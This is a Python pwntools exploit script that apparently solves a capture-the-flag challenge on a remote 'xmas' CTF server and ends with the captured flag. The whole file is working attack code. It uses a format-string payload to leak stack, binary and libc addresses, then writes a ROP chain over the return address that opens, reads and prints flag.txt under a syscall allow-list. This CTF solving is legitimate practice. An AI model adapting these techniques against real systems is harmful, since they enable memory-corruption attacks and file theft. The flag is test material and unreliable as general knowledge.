import pwn
import os

p = pwn.remote('challs.xmas.htsp.ro', 12003)
# p = pwn.process('./main')
# pwn.context.log_level = "DEBUG"
# pwn.context.terminal = ['tmux', 'splitw', '-h']
# base = p.libs()[os.path.join(os.getcwd(), 'main')]
# gdb_cmd = '''
#     set $base = 0x{:x}
#     b *$base+0xbf8
#     c
# '''.format(base)
# pwn.gdb.attach(p, gdbscript=gdb_cmd)

libc = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 19th arg is some stack address
# 31st arg is some ELF address
# 41st arg is __libc_start_main+231
p.sendlineafter('\n', '%19$p.%33$p.%41$p')
p.recvuntil('Oh, greetings ')
stack_leak = int(p.recvuntil('.')[:-1], 16)
elf_leak   = int(p.recvuntil('.')[:-1], 16)
libc_leak  = int(p.recvline().strip(), 16) - 231

libc_base  = libc_leak - libc.symbols['__libc_start_main']
libc_shell = libc_base + 0x4f2c5
elf_base   = elf_leak - 0xb8d
ret_addr   = stack_leak + 0x88

# Overwrite return address with &shell
p.recvuntil('Santa\n')

# Buffer is at 6th argument (%6$p)
from libformatstr import FormatStr

def send_fmt(addr, val):
    # Send first 4 bytes
    formatter = FormatStr(isx64=1)
    formatter[addr] = val & 0xffffffff
    buf = formatter.payload(6)
    p.sendline(buf)

    # Send second 4 bytes
    formatter = FormatStr(isx64=1)
    formatter[addr + 4] = val >> 32
    buf = formatter.payload(6)
    p.sendline(buf)

pop_rdi = libc_base + 0x000000000002155f
pop_rsi = libc_base + 0x0000000000023e6a
pop_rdx = libc_base + 0x0000000000001b96
pop_rax = libc_base + 0x00000000000439c8
syscall = libc_base + 0x00000000000d2975

buffer_space = stack_leak - 0x3000

# Filesystem Flags are here: https://github.com/torvalds/linux/blob/master/include/uapi/asm-generic/fcntl.h
rop_chain = [
    # Read file location string into memory
    pop_rdi,
    0,
    pop_rsi,
    buffer_space,
    pop_rdx,
    len('flag.txt'),
    pop_rax,
    0,
    syscall,

    # Open the file
    pop_rdi,
    buffer_space,
    pop_rsi,
    0, # O_RDONLY
    pop_rax,
    2,
    syscall,

    # Read file into memory
    pop_rdi,
    3,
    pop_rsi,
    buffer_space - 0x1000,
    pop_rdx,
    500,
    pop_rax,
    0,
    syscall,

    # Write buffer to stdout
    pop_rdi,
    1,
    pop_rsi,
    buffer_space - 0x1000,
    pop_rdx,
    500,
    pop_rax,
    1,
    syscall,

    libc_base + libc.symbols['exit']
]
for i in range(len(rop_chain)):
    send_fmt(ret_addr + i * 8, rop_chain[i])

p.sendline('end of letter')
p.recvuntil('end of letter')

pwn.log.info('Return Addr: ' + hex(ret_addr))
pwn.log.info('Elf    Base: ' + hex(elf_base))
pwn.log.info('Libc   Base: ' + hex(libc_base))
pwn.log.info("buffer space: " + hex(buffer_space))

p.interactive()

"""
Allowed syscalls:
    - 0:   sys_read
    - 1:   sys_write
    - 2:   sys_open
    - 3:   sys_close
    - 5:   sys_fstat
    - 15:  sys_rt_sigreturn
    - 60:  sys_exit
    - 231: sys_exit_group
    - 257: sys_openat
"""
# X-MAS{wr171n6_l3773r5_15_50_0ld_f45h10n}
